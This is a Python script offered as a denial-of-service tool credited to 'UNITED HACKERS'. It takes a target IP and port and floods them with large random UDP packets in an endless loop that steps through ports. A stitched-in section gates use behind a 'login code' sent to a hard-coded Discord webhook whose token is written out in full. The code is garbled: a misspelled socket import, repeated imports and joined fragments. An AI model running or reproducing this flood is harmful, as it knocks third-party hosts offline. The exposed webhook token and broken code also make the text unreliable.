import os
import random
import sys
import time
import socke
from datetime import datetime



#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

#
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day

month = now.month
year = now.year


def logo():
	os.system('clear')
	print(pink+red+b+'''
	           █▀▄ █▀▄ █▀█ █▀  
	           █▄▀ █▄▀ █▄█ ▄█   '''+b+red+pink)
	




#
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(50179)

#
#coded by lamp in python 3
from dhooks import Webhook
import os
import time
import random
os.system("title Enter Login Code")
hook = Webhook("https://discord.com/api/webhooks/957342681359585381/Yly1sxolwVSRL8RDLUqzwJumfVDQgCRncIpFnXdwNQlCs2dpbX_f7ZtebWh4nHz2Rkw4")
codes = random.randint(1,999)
hook.send(f"Hello, The Login Code is {codes}")

print("Hello There! Please Enter The Login Code...")
code = int(input("Enter Code : "))
if code == codes:
    print("Valid Code!!!")
    time.sleep(5)
else :
    print("Wrong Code.")
    time.sleep(5)
    exit()

def first(self):
	logo()
	print("")
	print(pink+b+"Author     : iAlvaGanz"+b+pink)
	print("Team	    : UNITED HACKERS")
	print("YouTube    : iAlvaGanz")
	print("")

	#
	ip = input(gren+b+"Target IP  : "+b+gren)
	port = int(input("Enter Port  : "))
	print("")
	print(cyan+b+"[+]--                            [+] 0%"+b+cyan)
	time.sleep(2)
	print("[+]--xxxxxxx>                    [+] 25%")
	time.sleep(2)
	print("[+]--xxxxxxxxxxxx>               [+] 50%")
	time.sleep(3)
	print("[+]--xxxxxxxxxxxxxxxxx>          [+] 75%")
	time.sleep(2)
	print(cyan+b+"[+]--xxxxxxxxxxxxxxxxxxxxxx>     [+] 100%"+b+cyan)
	time.sleep(2)
	os.system('clear')
	sent = 0
	
	while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		port = port + 1
		
		print(f"iAlvaGanz :- sent %s packet to %s througj port:%s"%(sent,ip,port))

first('f')
